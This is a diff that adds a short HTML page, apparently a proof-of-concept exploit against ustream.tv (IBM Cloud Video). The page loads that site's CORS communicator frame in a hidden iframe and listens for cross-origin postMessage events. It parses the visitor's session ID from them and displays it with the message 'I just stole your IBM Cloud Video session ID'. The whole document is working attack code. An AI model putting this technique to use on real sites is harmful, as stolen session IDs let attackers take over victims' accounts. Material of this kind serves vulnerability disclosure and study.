@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+            <title>Hello, I'm Gyuri</title>
+            <meta charset="utf-8">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    </head>
+<body>
+ 
+<iframe src="https://www.ustream.tv/corsCommunicatorFrameDirect" style="display: none"></iframe>
+    <div class="container">
+        <h1>Hello, I'm Gyuri</h1>
+ 
+        <p id="gyuri">
+        </p>
+    </div>
+ 
+    <script>
+            window.addEventListener("message", receiveMessage, false);
+ 
+            function receiveMessage(event)
+            {
+              var session_id = JSON.parse(event.data).sessionId
+              document.getElementById("gyuri").innerHTML += ("<p>Hello, I'm Gyuri! I just stole your IBM Cloud Video session ID ;):  " + session_id + "</p>")
+            }
+ 
+    </script>
+</body>
+</html>
